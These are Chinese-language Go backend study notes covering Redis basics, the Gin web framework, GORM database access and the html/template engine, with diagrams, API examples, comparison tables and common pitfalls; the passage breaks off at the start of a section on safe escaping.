# Go
---
## Redis
1. TTL 命令如果返回 -2，代表这个 key 根本不存在；如果返回 -1，代表这个 key 存在，但你忘了给它设过期时间
2.SET
```
rdb.Set(ctx, key, value, expiration)
```
- 作用：设置 key-value
- expiration=0：永久不过期；>0：自动过期；`redis.KeepTTL`：保留原有过期时间
- 返回 `*StatusCmd`，成功返回 `OK`
3. GET
```
rdb.Get(ctx, key)
```
- 作用：根据 key 取值
- 返回 `*StringCmd`
- 特殊：key 不存在时，err = `redis.Nil`（不是网络错误）不当作系统异常处理，当作正常业务结果
4.Hset
    建立一个小表格，每个字段独立存在，可单独读写
    Hset取出来的值是字符串
    当字段过多 不适合Hash HGetAll造成redis阻塞
5.Context.background():创建一个永不取消、无超时、不带值的根上下文，作为派生其他上下文的起点。
---
## 项目问题：
 - DB, err = gorm.Open(mysql.Open(dsn), &gorm.Config{})：
     1. **`mysql.Open(dsn)`**
    `dsn` = 连接字符串，里面写了：数据库地址、账号、密码、库名、编码
    `mysql.Open(dsn)`：**根据 dsn 信息，创建 MySQL 驱动的连接**。
    类比：拿着地址 + 账号密码，去敲数据库大门。

    2. **`gorm.Open(驱动连接, &gorm.Config{})`**
    gorm.Open 是 GORM 的入口函数：
    接收数据库驱动，**初始化 GORM 实例（遥控器）**`&gorm.Config{}`：GORM 配置，这里传空结构体，就是使用 GORM 默认配置。
    3. **返回两个值 `DB, err`**
    - `DB`：成功的话，就是`*gorm.DB`数据库遥控器，后续用来 Create/Find/AutoMigrate
    - `err`：错误信息
    - 数据库账号密码错、mysql 没启动、库不存在 → err 不为 nil
    - 连接成功 → err=nil
 - c.ShouldBind(obj interface{})
    签名：`func (c *Context) ShouldBind(obj interface{}) error` 
    > 核心：**自动检测请求的 Content-Type，选用对应绑定器，把请求数据填入你传的结构体指针；校验失败返回 error，**不会自动写响应、不会中断请求 **。
 - db.Create(&newTodo)
    签名：`db.Create(interface{}) *gorm.DB`
    ```
    result := db.Create(&newTodo)
    err := result.Error
    ```
    核心：**往数据库插入一条新记录**
    ## 执行流程
    1. 拿到你传的结构体指针 `&newTodo`
    2. 根据结构体 `Todo`，找到对应数据表（默认 `todos`）
    3. 生成 `INSERT INTO todos (title,status) VALUES (?,?)` SQL
    4. 执行插入
    5. ✅ **自动回填自增主键 ID 到 newTodo.ID**（这个很关键！）
 - # `c.Param("id")`（Gin）
    作用：**获取路径参数（path param）**，从 URL 路径里拿 `:id` 占位符对应的值，返回字符串类型。
    ### 1. 最简示例
    ```
    r.GET("/user/:id", func(c *gin.Context) {
        // 取出路径里的id
        idStr := c.Param("id")
        // 拿到的是string，用GORM查数据库一般要转int
        // var id int
        // id, _ = strconv.Atoi(idStr)
        c.String(200, "用户id：%s", idStr)
    })
    ```
    - 访问：`GET /user/10` → `c.Param("id")` 得到 `"10"`
    - 路由里必须写 `:id`，冒号是标记，代表动态占位符Gin Web Fr...
    ### 2. 和 `c.Query("id")` 区分（高频踩坑）
    - `c.Param("id")`：**路径参数**，在 `/` 之间，`/user/:id` → `/user/10`
    - `c.Query("id")`：**查询参数**，在 `?` 后面，`/user?id=10`
    ### 3. 重要特性
    1. 返回值永远是 `string`，**不会自动转数字**，传给 GORM 查库必须手动转类型
    2. 路由不匹配时，Gin 根本不会进这个 handler，不用判空
    3. 底层等价：`c.Params.ByName("id")` 的简写腾讯云
    4. REST 风格标准用法：查单条、删除、修改资源都用它（`GET /book/:id`、`DELETE /book/:id`） 
 - 1. `db.First(&todo,id)` → todo = 数据库里的旧记录
   2. `c.ShouldBindJSON(&todo)` → **前端传了哪些字段，就只覆盖哪些字段；前端没传的字段，保留数据库原来的值**


















# Go 后端开发结构化技术笔记

> 写作范式：定位 → 架构图/流程图 → 核心 API → 对比表格 → 坑 & 边界 → 原理追问 → 知识全景
> 风格：工程导向，非纯语法手册；重点突出「边界、坑、设计取舍」

---

# 主题一：Gin 框架与 Go 并发 Web 服务

## 一、定位

**Gin 是什么？** Gin 是 Go 语言编写的高性能 HTTP Web 框架，负责接收客户端请求、路由分发、参数解析和响应渲染。

**解决什么问题？** 原生 `net/http` 需要手动注册路由、解析参数、编写中间件——代码量大且重复。Gin 用路由树 + 中间件流水线 + 参数绑定，把样板代码压缩到最少。

**适用场景：**

- RESTful API / GraphQL 接入层
- 微服务网关、BFF（Backend for Frontend）
- 需要高吞吐的 Web 后端服务

**一句话：** Gin 负责"接客"——收请求、分路由、给响应。

---

## 二、架构图 / 流程图

### 2.1 请求处理流水线

```
客户端请求
    │
    ▼
┌──────────────────────────────────────────────┐
│              gin.Engine（路由树）             │
│                                              │
│  静态路径 > :name 参数节点 > *path 通配节点    │
│                                              │
└──────────────┬───────────────────────────────┘
               │ 匹配到 Handler
               ▼
┌─────────────────────────────────────────────————─┐
│           中间件流水线（Chain）                    │
│                                                  │
│  Middleware1(Pre) → c.Next() → Middleware1(Post) │
│        ↓                                         │
│  Middleware2(Pre) → c.Next() → Middleware2(Post) │
│        ↓                                         │
│      Handler（业务逻辑）                          │
│        ↓                                         │
│  c.Abort() 可在此中断后续中间件                    │
└──────────────┬───────────────────────────────————┘
               │
               ▼
        c.JSON(200, data)
               │
               ▼
          客户端响应
```

### 2.2 gin.Context 生命周期与并发复用模型

```
Request In
    │
    ▼
┌──────────────────┐
│ sync.Pool.Get()   │ ← 从对象池取出复用 Context
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Handler & Middleware 执行 │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ sync.Pool.Put()   │ ← 重置状态并归还池
└────────┬─────────┘
         │
         ▼
    Response Out
```

**关键设计：** Context 对象被复用意味着——你在请求 A 中拿到的 `c` 引用，在请求 B 处理时可能被重新赋值。这就是 goroutine 并发坑的根本原因。

### 2.3 Gin 在技术栈中的位置

```
客户端 (Browser/App)
    │ HTTP
    ▼
┌─────────────────┐
│  Gin 接入层      │ ← 路由、参数解析、中间件、鉴权
└────────┬────────┘
         │ 业务对象传递
         ▼
┌─────────────────┐
│  Go 业务层       │ ← 业务逻辑、errgroup 并发、日志
└────────┬────────┘
         │ 指针/结构体
         ▼
┌─────────────────┐
│  GORM 持久层     │ ← 模型映射、CRUD、事务
└────────┬────────┘
         │ SQL
         ▼
┌─────────────────┐
│  MySQL 数据库    │
└─────────────────┘
```

---

## 三、核心 API

### 3.1 引擎创建

```go
// gin.Default() = gin.New() + Logger() + Recovery()
r := gin.Default()  // 开发环境首选，自带日志和 panic 恢复

// gin.New() = 纯净引擎，无内置中间件
r2 := gin.New()     // 需要精细控制中间件时使用
```

**设计取舍：** `Default` 适合快速开发，但生产环境建议用 `New()` 手动组装中间件，避免引入不需要的功能。

### 3.2 路由注册

```go
r.GET("/ping", func(c *gin.Context) {
    c.JSON(200, gin.H{"msg": "pong"})
})

// 参数路由
r.GET("/user/:id", getUser)

// 通配路由
r.GET("/files/*filepath", serveFiles)

// 路由组 + 中间件
api := r.Group("/api/v1", AuthMiddleware())
{
    api.GET("/users", listUsers)
    api.POST("/users", createUser)
}
```

**路由优先级（静态 > 参数 > 通配）是设计决定，不是 bug：**

```go
r.GET("/user/detail", h1)   // 优先匹配
r.GET("/user/:name", h2)    // 兜底
// 访问 /user/detail → h1；访问 /user/张三 → h2
```

### 3.3 参数绑定与校验

```go
type LoginForm struct {
    Username string `form:"username" binding:"required,min=3,max=20"`
    Email    string `form:"email" binding:"required,email"`
}

var form LoginForm
if err := c.ShouldBind(&form); err != nil {
    c.JSON(400, gin.H{"err": err.Error()})
    return
}
```

**参数来源速查：**

| 来源 | 位置 | 读取方法 |
|------|------|----------|
| Query | URL `?key=value` | `c.Query("key")` / `c.DefaultQuery("key", "default")` |
| Form | 请求体 (application/x-www-form-urlencoded) | `c.PostForm("key")` |
| Path | URL 路径段 | `c.Param("key")` |
| JSON | 请求体 (application/json) | `c.ShouldBindJSON(&obj)` |
| Header | 请求头 | `c.GetHeader("X-Token")` |

### 3.4 中间件

```go
func LogMiddleware(c *gin.Context) {
    start := time.Now()
    path := c.Request.URL.Path
    c.Next()  // 执行后续中间件 + Handler
    cost := time.Since(start)
    log.Printf("[%s] %s %v", c.Request.Method, path, cost)
}

// 中断中间件链
func AuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        if !isValid(c.GetHeader("Token")) {
            c.JSON(401, gin.H{"err": "unauthorized"})
            c.Abort()
            return  // 黄金组合：响应 + Abort + return
        }
        c.Next()
    }
}
```

### 3.5 并发多服务启动

```go
var g errgroup.Group

g.Go(func() error { return r1.Run(":8080") })
g.Go(func() error { return r2.Run(":8081") })

if err := g.Wait(); err != nil {
    log.Fatal(err)  // 任一服务出错，主程序退出
}
```

---

## 四、对比表格

### 4.1 Web 框架对比

| 对比项 | Gin | Echo | Fiber | net/http（原生） |
|--------|-----|------|-------|------------------|
| 路由性能 | 极高（httprouter 基数树） | 高（radix tree） | 极高（FastHTTP） | 中（线性匹配） |
| 中间件机制 | 链式，c.Next()/Abort() | 链式，c.Next() | 链式（Express.js 风格） | 需手动实现 |
| 参数绑定 | ShouldBind 强类型 + tag | Bind 强类型 + tag | Bind 强类型 + tag | 手动解析 |
| 生态成熟度 | 最成熟，社区最大 | 成熟 | 较新（Node.js 背景） | 标准库，零依赖 |
| 学习曲线 | 低 | 低 | 低（JS 背景友好） | 中 |
| 并发模型 | goroutine + Context | goroutine + Context | goroutine + Context | goroutine |

### 4.2 gin.Default() vs gin.New()

| 对比项 | gin.Default() | gin.New() |
|--------|---------------|-----------|
| Logger 中间件 | 自带 | 无 |
| Recovery 中间件 | 自带 | 无 |
| 适用场景 | 日常开发 / 快速原型 | 生产环境精细控制 |

**设计取舍：** `Default` 多了一个 Recovery 中间件，能捕获 handler panic 并返回 500 JSON，但**不能阻止 `log.Fatal` 退出**——这是设计决定，`log.Fatal` 调用的是 `os.Exit(1)`，绕过了一切 defer 和 recover。

---

## 五、坑 & 边界（重点）

### 5.1 多端口阻塞坑

**现象：** 同一个 `r` 调两次 `r.Run()`，第二个端口永远监听不到。

```go
r := gin.Default()
r.Run(":8080")  // 阻塞！下面的代码永远不会执行
r.Run(":8081")  // 执行不到
```

**根因：** `r.Run()` 底层调用 `http.Server.ListenAndServe()`，这是一个**阻塞调用**，会一直运行直到服务关闭。

**正确做法：** 多个引擎 + errgroup。

### 5.2 goroutine 与 Context 并发安全（高危）

**现象：** 在 Handler 中开启 goroutine 使用 `c`，导致数据错乱或 panic。

```go
// 错误写法
r.GET("/async", func(c *gin.Context) {
    go func() {
        c.JSON(200, gin.H{"msg": c.Request.URL.Path})  // 危险！
    }()
})
```

**根因：** Gin 使用 `sync.Pool` 复用 `gin.Context` 对象。当一个请求处理完后，Context 会被归还到池中被下一个请求复用——如果你还在 goroutine 里引用它，就会读到被覆盖的数据。

**安全写法：**

```go
// 方案1：提前取值传入
path := c.Request.URL.Path
go func(p string) {
    // 使用 p（普通字符串，无并发问题）
}(path)

// 方案2：c.Copy() 副本（只读，不能写响应）
cCp := c.Copy()
go func() {
    fmt.Println(cCp.Request.URL.Path)
}()
```

**边界：** `c.Copy()` 返回的副本是**只读**的，不能用来写响应（`c.JSON` 会 panic），也不能调用 `c.Next()` / `c.Abort()`。

### 5.3 中间件中断坑

**现象：** 写了 `c.Abort()` 但后面的代码仍然执行。

```go
func AuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        if !isValid(c.GetHeader("Token")) {
            c.JSON(401, gin.H{"err": "unauthorized"})
            c.Abort()
            // 缺少 return！下面的代码仍会执行
            doSomething()  // 被执行了！
        }
        c.Next()
    }
}
```

**黄金组合：** `c.JSON(状态码, ...)` + `c.Abort()` + `return`

### 5.4 重复注册路由 panic

```go
r.GET("/test", h1)
r.Any("/test", h2)  // panic: handlers are already registered for ...
```

**根因：** Gin 的路由树不允许同一路径-方法组合注册多个 Handler。

### 5.5 log.Fatal 与 Recovery 的关系

| 函数 | 行为 | 是否退出 | 是否执行 defer | 能否 recover |
|------|------|----------|---------------|-------------|
| `log.Print` | 打印日志 | 否 | 是 | — |
| `log.Panic` | 打印 + panic | 否 | 是 | 能 |
| `log.Fatal` | 打印 + os.Exit(1) | 是 | 否 | 否 |

**设计取舍：** `log.Fatal` 适合启动阶段失败（如数据库连不上），不适合业务 handler 里的普通错误。Gin 的 `Recovery` 中间件能捕获 panic，但**无法阻止 `log.Fatal` 退出**。

---

## 六、原理追问

### 6.1 为什么 Gin 要复用 gin.Context？

**设计动机：** 每个 HTTP 请求都要分配内存创建对象，高并发下 GC 压力巨大。Gin 用 `sync.Pool` 预分配 Context 对象池，请求结束后归还而非销毁，大幅降低 GC 频率。

**代价：** 你不能在请求处理完成后仍持有 Context 引用——它可能被复用并覆盖。这就是 goroutine 坑的根本原因。

### 6.2 为什么 r.Run() 是阻塞的？

**设计动机：** Go 的 HTTP 服务器设计哲学——`ListenAndServe` 启动后永久阻塞，监听端口接受连接。这简化了服务生命周期管理：主 goroutine 不退出 = 服务运行中。

**工程实践：** 需要非阻塞启动时，用 `go r.Run()` 启动goroutine，但这样你就失去了错误捕获能力——所以推荐 errgroup 方案。

### 6.3 为什么路由优先级是 静态 > 参数 > 通配？

**设计动机：** 这是 httprouter（Gin 路由底层实现）的基数树（Radix Tree）设计决定的。静态节点最先匹配，因为静态路径更具体；通配符最后匹配，因为它是"兜底"。这保证了 `/user/detail` 不会被 `/user/:name` 误匹配。

### 6.4 为什么中间件用 c.Next() 而非回调？

**设计取舍：** `c.Next()` 允许中间件在 Handler 执行前后都插入逻辑（Pre/Post 模式），比回调更灵活。但代价是调用栈变深——极端情况下（大量中间件嵌套）可能影响性能，不过 Gin 的路由优化已经最小化了这个问题。

---

## 七、知识全景

### 7.1 Gin 技术栈分层

| 层级 | 技术 | 职责 |
|------|------|------|
| 接入层 | Gin | 接收请求、路由分发、参数解析、响应渲染 |
| 业务层 | Go 代码 | 业务逻辑、并发控制（errgroup）、错误处理 |
| 持久层 | GORM + MySQL | 数据存储、查询、事务 |

### 7.2 并发服务管理：errgroup vs WaitGroup

| 能力 | sync.WaitGroup | errgroup.Group |
|------|----------------|----------------|
| 等待结束 | ✅ | ✅ |
| 收集错误 | ❌ | ✅ 返回第一个错误 |
| Context 取消 | ❌ | ✅ 可用 WithContext |

### 7.3 后续扩展方向

- 统一响应结构 + 错误码设计
- JWT 鉴权中间件
- 分页查询封装
- 结构化日志（zap/logrus）
- 配置文件管理（viper）
- 接口文档自动生成（swaggo）

---

# 主题二：数据库基础与 GORM 数据持久化

## 一、定位

**GORM 是什么？** GORM 是 Go 语言生态中最流行的 ORM（对象关系映射）库。它充当"翻译官"，将 Go 结构体自动翻译为 SQL 语句发给数据库，再把查询结果映射回 Go 结构体。

**解决什么问题？** 手写 SQL 拼接 + 结果扫描 + 错误处理代码量大且容易出错。GORM 用结构体 Tag 声明表结构，用链式 API 构建查询，大幅减少样板代码。

**适用场景：** 任何需要与关系型数据库交互的 Go 后端项目（MySQL、PostgreSQL、SQLite 等）。

**一句话：** GORM 负责"存取"——把 Go 对象存进数据库，再从数据库取出来还原成 Go 对象。

---

## 二、架构图 / 流程图

### 2.1 GORM 内部工作流程

```
Go 结构体实例
    │
    ▼
┌─────────────────────────────────────────────┐
│           GORM Statement Builder             │
│                                             │
│  db.Where("age > ?", 18)                    │
│    .Order("created_at desc")                │
│    .Limit(10)                               │
│                                             │
│  → 在内存中拼接 SQL 片段（此时不发SQL）       │
└─────────────┬───────────────────────────────┘
              │ 遇到执行器
              ▼
┌─────────────────────────────────────────────┐
│           SQL 生成器                          │
│                                             │
│  将 Statement 对象 → 生成最终 SQL 字符串      │
│  自动处理占位符防注入 (? 参数化)              │
└─────────────┬───────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│           DB Driver (sql/driver)             │
│                                             │
│  通过 database/sql 驱动发送给数据库           │
└─────────────┬───────────────────────────────┘
              │ 结果集
              ▼
┌─────────────────────────────────────────────┐
│           结果映射器                           │
│                                             │
│  扫描 Rows → 填充 Go 结构体字段               │
│  自动处理类型转换、关联预加载                  │
└─────────────┬───────────────────────────────┘
              │
              ▼
        Go 结构体实例
```

### 2.2 AutoMigrate 迁移机制

```
[Struct Definition] --> [Compare with DB Schema]
                             │
              +--------------+--------------+
              │                             │
       [Missing Column]              [Missing Table]
              │                             │
       [ALTER TABLE ADD]              [CREATE TABLE]
              │                             │
              ▼                             ▼
       (只增不删，不处理删除/修改)    (幂等，重复执行无副作用)
```

### 2.3 GORM 在技术栈中的位置

```
Gin 业务层（Handler / Service）
    │ 模型对象
    ▼
┌─────────────────┐
│  GORM 持久层     │ ← 模型映射、CRUD、事务、迁移
└────────┬────────┘
         │ SQL（参数化）
         ▼
┌─────────────────┐
│  MySQL / PG / SQLite │
└─────────────────┘
```

---

## 三、核心 API

### 3.1 连接数据库

```go
dsn := "root:123456@tcp(127.0.0.1:3306)/gorm_learn?charset=utf8mb4&parseTime=True&loc=Local"
db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
```

**DSN 参数对照表：**

| 参数 | 作用 | 漏写了会怎样 |
|------|------|-------------|
| `charset=utf8mb4` | 支持中文和 emoji 字符 | 中文/emoji 可能乱码或写入失败 |
| `parseTime=True` | 将数据库时间类型转为 Go `time.Time` | 时间字段变成 `[]byte`，读写异常 |
| `loc=Local` | 使用本地时区 | 时间差 8 小时（UTC vs CST） |

### 3.2 模型定义

```go
type User struct {
    gorm.Model          // 嵌入字段：ID, CreatedAt, UpdatedAt, DeletedAt
    Name string          `gorm:"type:varchar(50);not null"`
    Age  int            `gorm:"default:0;uniqueIndex"`
    Role string         `gorm:"column:role_type;not null"`
}
```

**gorm.Model 包含的字段：**

| 字段 | 数据库列 | 作用 |
|------|----------|------|
| `ID` | `id` (BIGINT PRIMARY KEY AUTO_INCREMENT) | 主键 |
| `CreatedAt` | `created_at` (DATETIME) | 创建时间 |
| `UpdatedAt` | `updated_at` (DATETIME) | 最后更新时间 |
| `DeletedAt` | `deleted_at` (DATETIME) | 软删除时间 |

### 3.3 CRUD 操作

```go
// Create
user := User{Name: "张三", Age: 25}
db.Create(&user)  // 创建后 user.ID 自动填充

// Read - 单条
var u User
db.First(&u, 1)           // 按主键查，查不到返回 ErrRecordNotFound
db.First(&u, "name = ?", "张三")  // 条件查

// Read - 列表
var users []User
db.Where("age > ?", 18).Find(&users)  // 查列表，查不到返回空切片（不报错）

// Update
db.Model(&user).Update("Name", "李四")          // 更新单列
db.Model(&user).Updates(User{Name: "李四", Age: 26})  // 更新多列

// Delete
db.Delete(&user)  // 软删除（设置 DeletedAt 时间）
```

### 3.4 链式查询

```go
// 链式拼接 SQL 片段（不执行）
results := db.Where("views > ?", 50).
    Order("id desc").
    Limit(10).
    Offset(20).
    Find(&articles)
```

### 3.5 关联查询

```go
// 预加载（解决 N+1 问题）
var users []User
db.Preload("Articles").Preload("Articles.Category").Find(&users)

// 关联定义
type User struct {
    gorm.Model
    Name     string
    Articles []Article `gorm:"foreignKey:AuthorID"`
}
```

### 3.6 迁移

```go
// 自动建表（幂等，只增不删）
db.AutoMigrate(&User{}, &Article{})

// 手动迁移（生产环境用）
db.Migrator().DropColumn(&Article{}, "Views")
db.Migrator().RenameColumn(&Article{}, "title", "headline")
```

---

## 四、对比表格

### 4.1 ORM / 数据访问层对比

| 对比项 | GORM | SQLX | 原生 sql.DB |
|--------|------|------|-------------|
| 开发效率 | 极高（ORM 自动映射） | 中（需手写 SQL） | 低（完全手写） |
| SQL 控制权 | 低（自动生成） | 高（手写 SQL） | 最高（完全控制） |
| 性能 | 中（有抽象开销） | 高（接近原生） | 最高 |
| 学习曲线 | 低 | 中 | 高 |
| 迁移能力 | 内置 AutoMigrate | 需第三方工具（goose） | 无 |
| 关联查询 | 内置支持（Preload） | 需手写 JOIN | 手写 JOIN + 手动扫描 |
| 适用场景 | 快速开发、中小型项目 | 性能敏感、复杂查询 | 底层控制、高性能场景 |

### 4.2 First vs Find 行为对比

| 方法 | 接收参数 | 查不到时的行为 | 适用场景 |
|------|----------|---------------|----------|
| `First` | 结构体指针 | 返回 `ErrRecordNotFound` | 查单条，必须存在 |
| `Last` | 结构体指针 | 返回 `ErrRecordNotFound` | 查最后一条 |
| `Find` | 切片指针 | 返回空切片（不报错） | 查列表 |
| `Take` | 结构体指针 | 返回 `ErrRecordNotFound` | 查随机一条 |

---

## 五、坑 & 边界（重点）

### 5.1 链式复用污染（高危）

**现象：** 将查询对象存为变量复用，条件无限叠加。

```go
// 错误写法
query := db.Where("status = ?", "active")
list1 := query.Find(&users1)   // WHERE status = 'active'
list2 := query.Order("id desc").Find(&users2)  // WHERE status = 'active' ORDER BY id desc
list3 := query.Where("age > ?", 18).Find(&users3)  // WHERE status = 'active' AND age > 18 (条件叠加！)
```

**根因：** GORM 的链式方法返回的是 `*Statement` 对象，内部维护了一个条件累积的 map。每次调用 `Where` 都是在同一个 Statement 上追加条件。

**正确做法：** 即用即拼，或用 `db.Session()` 创建干净会话。

```go
// 正确：每次从 db 起点开始
db.Where("status = ?", "active").Find(&users1)
db.Where("status = ?", "active").Order("id desc").Find(&users2)

// 或用 Session 隔离
session := db.Session(&gorm.Session{})
query := session.Where("status = ?", "active")
```

### 5.2 AutoMigrate 边界（设计取舍）

**AutoMigrate 的行为边界：**

| 操作 | AutoMigrate 是否处理 | 说明 |
|------|---------------------|------|
| 新增表 | ✅ | 创建新表 |
| 新增字段 | ✅ | ALTER TABLE ADD COLUMN |
| 修改字段类型 | ❌ | 不会自动改类型，需手动迁移 |
| 删除结构体字段 | ❌ | **不会删旧列**（安全设计） |
| 修改表名 | ❌ | 不会重命名表 |

**根因设计：** AutoMigrate 遵循"只增不删"原则，防止误操作丢失数据。删除列是破坏性操作，必须用 `Migrator().DropColumn()` 显式调用。

**工程规范：** 生产环境禁止在 `main()` 启动流程中放 `AutoMigrate`，应使用独立的迁移工具（如 goose、golang-migrate）管理版本化迁移脚本。

### 5.3 结构体 Tag 解析陷阱

**Tag 格式严格要求：**

```go
// 正确
Name string `gorm:"type:varchar(50);not null;uniqueIndex"`

// 错误：缺少反引号包裹
Name string gorm:"type:varchar(50)"  // 编译错误

// 错误：tag 值中的引号未正确嵌套
Name string `gorm:"type:varchar(50)"not null`  // 解析失败

// 注意：primaryKey 的 K 必须大写
ID uint `gorm:"primaryKey"`  // ✅
ID uint `gorm:"primarykey"`  // ❌ 不生效
```

### 5.4 错误处理：业务错误 vs 系统错误

**核心规则：** 查不到数据是**业务常态**，不是系统错误。

```go
// 错误写法：把业务错误当崩溃
var user User
db.First(&user, 999)
if err != nil {
    log.Fatal(err)  // 用户不存在就杀进程？不应该
}

// 正确写法
var user User
if err := db.First(&user, 999).Error; err != nil {
    if errors.Is(err, gorm.ErrRecordNotFound) {
        c.JSON(404, gin.H{"err": "user not found"})
        return
    }
    // 真正的系统错误才 Fatal
    log.Printf("db error: %v", err)
    c.JSON(500, gin.H{"err": "internal error"})
    return
}
```

### 5.5 全表更新/删除保护

```go
// 危险：没有指定 Model 或主键为 0
db.Delete(&User{})  // GORM 拦截，返回错误（保护机制）
db.Delete(&User{ID: 0})  // 主键为 0，GORM 也会拦截

// 正确：指定条件
db.Where("id = ?", 1).Delete(&User{})
```

**设计取舍：** GORM 在 `Delete` 时如果没有主键值，会返回错误而非执行全表删除——这是安全设计，防止误操作。

### 5.6 DSN 连接错误速查

| 错误信息 | 原因 | 解决 |
|----------|------|------|
| `Access denied` | 用户名或密码错误 | 检查 DSN 中的凭据 |
| `Unknown database` | 数据库不存在 | 先 `CREATE DATABASE` |
| `connection refused` | MySQL 未启动 / 端口不对 | 检查 MySQL 服务状态 |
| 时间字段读写异常 | 漏写 `parseTime=True` | 补上参数 |
| 时区差 8 小时 | 漏写 `loc=Local` | 补上参数 |

---

## 六、原理追问

### 6.1 为什么 GORM 链式调用不立即执行 SQL？

**设计动机：** 延迟执行（Lazy Execution）设计。链式方法只在内存中拼接 SQL 片段，直到遇到"执行器"（`First`、`Find`、`Create`、`Update`、`Delete` 等）才真正生成 SQL 并发送给数据库。

**好处：** 可以灵活组合查询条件，无需关心 SQL 拼接语法。

**代价：** 链式对象内部状态会累积，导致"链式复用污染"坑。

### 6.2 为什么 AutoMigrate 不删除列？

**设计取舍：** 这是一个**安全优先**的设计决定。自动删除列可能导致生产环境数据丢失（比如你删了结构体字段以为就删了列，但可能还有其他系统在使用这列）。GORM 选择"只增不删"，破坏性操作必须显式调用 `Migrator().DropColumn()`。

### 6.3 为什么 GORM 用 `gorm.Model` 嵌入而非普通字段？

**设计动机：** 嵌入（Embedding）是 Go 的组合语法。嵌入 `gorm.Model` 后，`User` 结构体自动拥有 `ID`、`CreatedAt` 等字段，同时 GORM 的反射机制能识别这些嵌入字段并映射到数据库列。这比在每个模型中重复写相同字段更简洁。

### 6.4 为什么 Preload 能解决 N+1 问题？

**N+1 问题：** 先查 N 条用户（1 条 SQL），再循环查每个用户的文章（N 条 SQL），总共 N+1 条。

**Preload 原理：** GORM 检测到 `Preload("Articles")` 后，会生成两条 SQL：
1. `SELECT * FROM users`
2. `SELECT * FROM articles WHERE author_id IN (user1_id, user2_id, ...)`

用 2 条 SQL 替代 N+1 条，这就是"预加载"的含义——提前把关联数据一次性加载进来。

---

## 七、知识全景

### 7.1 数据访问层选型决策树

```
需要操作数据库
    │
    ├─ 简单 CRUD，快速开发 → GORM（首选）
    │   ├─ 查询简单 → GORM 链式 API
    │   └─ 查询复杂 → GORM + 原生 SQL 混合
    │
    ├─ 性能敏感，查询复杂 → SQLX
    │   ├─ 需要手写 SQL 但想省扫描代码
    │   └─ 需要精细控制 SQL 执行计划
    │
    └─ 极致性能，底层控制 → 原生 sql.DB + sql.Rows
        ├─ 大数据量批量处理
        └─ 复杂事务控制
```

### 7.2 GORM 迁移策略

| 环境 | 策略 | 工具 |
|------|------|------|
| 开发环境 | AutoMigrate（方便） | `db.AutoMigrate()` |
| 测试环境 | 自动建表 + 事务回滚 | `gorm.Open` + `t.Cleanup()` |
| 生产环境 | 版本化迁移脚本 | goose / golang-migrate |

### 7.3 后续扩展方向

- GORM 事务处理（`db.Transaction`）
- 读写分离（多数据库连接）
- 数据库连接池调优（`SetMaxOpenConns`、`SetMaxIdleConns`）
- 字段级别权限控制（哪些字段可被外部写入）
- 审计字段自动填充（CreatedBy、UpdatedBy）
- 软删除 vs 硬删除的选型讨论

---

# 主题三：Go 模板引擎 (html/template)

## 一、定位

**html/template 是什么？** Go 标准库中的模板引擎，用于将数据与 HTML 页面分离。

**解决什么问题？**
1. 字符串拼接 HTML 导致代码混乱、前后端耦合
2. 用户输入包含 `<script>` 等危险字符时引发 XSS 攻击

**适用场景：**
- 服务端渲染（SSR）网页
- 生成 HTML 格式邮件
- 动态生成文档（如 PDF 的 HTML 中间层）

**一句话：** 模板引擎 = 把"页面长什么样"和"数据是什么"分开，用占位符在中间搭桥。

---

## 二、架构图 / 流程图

### 2.1 模板渲染三步走

```
┌─────────────────┐
│  1. 定义模板     │  编写含 {{ }} 占位符的 .tmpl 文件
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  2. 解析模板     │  ParseFiles / ParseGlob
│                 │  读取文件 → 构建语法树（AST）→ 编译
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  3. 渲染模板     │  Execute / ExecuteTemplate
│                 │  填入数据 → 替换占位符 → 输出到 io.Writer
└────────┬────────┘
         │
         ▼
    最终 HTML → 浏览器
```

### 2.2 数据流向

```
Go 数据（结构体 / map）
    │
    ▼
┌─────────────────┐
│  模板文件         │  含 {{ .Field }} 等占位符
│  (HTML 骨架)     │
└────────┬────────┘
         │ 渲染引擎替换
         ▼
┌─────────────────┐
│  自动转义        │  < → &lt;  防止 XSS
└────────┬────────┘
         │
         ▼
    安全 HTML 输出
```

### 2.3 模板继承结构

```
base.tmpl（骨架模板，定义 block）
    ▲
    │ {{ template "base.tmpl" }}
    │
index.tmpl（页面模板，define 覆盖 block）
    │
    ▼
ExecuteTemplate(w, "index.tmpl", data)
```

---

## 三、核心 API

### 3.1 基础解析与渲染

```go
// 解析模板文件
tmpl, err := template.ParseFiles("./index.tmpl")
if err != nil {
    log.Fatal(err)  // 解析失败必须立即 return
}

// 准备数据
data := map[string]interface{}{"Name": "张三", "Age": 25}

// 渲染输出
err = tmpl.Execute(w, data)
```

### 3.2 模板继承（block 机制）

**base.tmpl：**
```html
<!DOCTYPE html>
<html>
<head><title>{{ block "title" . }}默认标题{{ end }}</title></head>
<body>
{{ block "content" . }}
    <p>默认内容</p>
{{ end }}
</body>
</html>
```

**index.tmpl：**
```html
{{ template "base.tmpl" }}

{{ define "title" }}用户详情页{{ end }}

{{ define "content" }}
    <h1>{{ .Name }} 的个人资料</h1>
{{ end }}
```

**渲染：**
```go
tmpl, _ := template.ParseFiles("./base.tmpl", "./index.tmpl")
tmpl.ExecuteTemplate(w, "index.tmpl", data)  // 指定入口模板
```

### 3.3 语法核心

| 语法 | 作用 | 示例 |
|------|------|------|
| `{{ . }}` | 打印当前数据 | `{{ .Name }}` |
| `{{ $x := .Name }}` | 声明变量 | `{{ $title := .Title }}` |
| `{{- ... -}}` | 去除空白 | `{{- .Name -}}` |
| `{{ .Name \| func }}` | 管道 | `{{ .Name \| printf "%s真帅" }}` |
| `{{ if .Age }}...{{ end }}` | 条件 | 零值判断 |
| `{{ range .Users }}...{{ end }}` | 循环 | 遍历切片 |
| `{{ with .User }}...{{ end }}` | 切换上下文 | 简化深层字段访问 |

### 3.4 自定义函数

```go
// 定义函数
kua := func(arg string) (string, error) {
    return arg + "真帅", nil
}

// 注册（必须在 Parse 之前！）
tmpl, err := template.New("hello").
    Funcs(template.FuncMap{"kua": kua}).
    ParseFiles("./hello.html")
```

### 3.5 安全转义与关闭

```go
